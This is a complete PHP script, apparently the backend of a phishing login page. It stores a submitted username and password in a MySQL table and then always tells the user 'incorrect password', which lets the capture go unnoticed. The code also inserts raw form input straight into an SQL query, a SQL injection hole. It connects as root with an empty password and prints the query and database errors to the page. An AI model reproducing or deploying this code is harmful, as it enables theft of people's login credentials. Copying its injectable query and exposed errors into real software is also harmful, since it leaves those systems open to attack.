<?php
// Assuming you have already established a database connection

$servername = "localhost";
$user = "root";
$password = "";
$db = "loging";

$conn = new mysqli($servername, $user, $password, $db);

if ($conn->connect_error) {
	die("connection error");
}


// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the login details from the form
    $username = $_POST["username"];
    $lastname = $_POST["lastname"];

    // Perform any necessary validation on the input fields

    // Hash the password (optional but recommended)
    //$hashedPassword = password_hash($password, PASSWORD_DEFAULT);

    // Store the login details in the database
    $sql = "INSERT INTO details (username, pass) VALUES ('$username', '$lastname')";
    
    if (mysqli_query($conn, $sql)) {
        echo "incorrect password";
    } else {
        echo "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
}
?>

